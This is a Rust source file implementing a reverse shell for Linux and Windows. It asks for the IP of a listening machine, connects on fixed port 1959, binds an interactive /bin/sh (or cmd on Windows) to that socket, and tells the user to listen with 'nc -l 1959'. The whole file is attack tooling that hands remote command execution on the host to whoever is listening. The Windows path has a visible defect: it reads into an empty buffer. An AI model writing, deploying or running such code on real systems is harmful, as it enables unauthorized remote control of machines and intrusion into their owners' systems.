#[cfg(target_os = "linux")]
use std::{
    net::TcpStream,
    os::unix::io::{AsRawFd, FromRawFd},
    process::{Command, Stdio},
};

#[cfg(target_os = "windows")]
use std::{
    io::{Read, Write},
    net::TcpStream,
    process::{Command, Stdio},
};

#[cfg(target_os = "linux")]
fn unix_rev_shell(ip: &str, port:u16){
    let sock = TcpStream::connect((ip, port)).unwrap();
    let file_d = sock.as_raw_fd();
    Command::new("/bin/sh").arg("-i")
        .stdin(unsafe {Stdio::from_raw_fd(file_d)})
        .stdout(unsafe {Stdio::from_raw_fd(file_d)})
        .stderr(unsafe {Stdio::from_raw_fd(file_d)})
        .spawn().unwrap().wait().unwrap();
}

#[cfg(target_os = "windows")]
fn win_rev_shell(ip: &str, port:u16){
    let mut sock = TcpStream::connect((ip, port)).unwrap();
    let proc = Command::new("cmd")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn().unwrap();

    let mut buff = vec![];
    sock.read(&mut buff).unwrap();

    match proc.stdin.unwrap().write_all(&buff){
        Err(e) => panic!("[ERR] writing to stdin: {}", e.to_string()),
        Ok(_) => println!("send command to shell"),
    }

    match proc.stdout.unwrap().read_to_end(&mut buff){
        Err(e) =>  panic!("[ERR] reading shell stdout: {}", e.to_string()),
        Ok(_) => sock.write_all(&buff).unwrap(),
    }
}

fn main() {
    //let ip = "0.0.0.0";
    println!("If you want to test the program localy enter 0.0.0.0\nThe port you should be listening on is always 1959\nThe command to listen for the connection should be: 'nc -l 1959'\nEnter IP of the listening machine:");
    let mut ip = String::new();
    std::io::stdin().read_line(&mut ip).unwrap();
    let port: u16 = 1959;
    #[cfg(target_os = "windows")]
    win_rev_shell(&*ip, port);//ip is explicitely reborrowed
    #[cfg(target_os = "linux")]
    unix_rev_shell(&*ip,port);

}
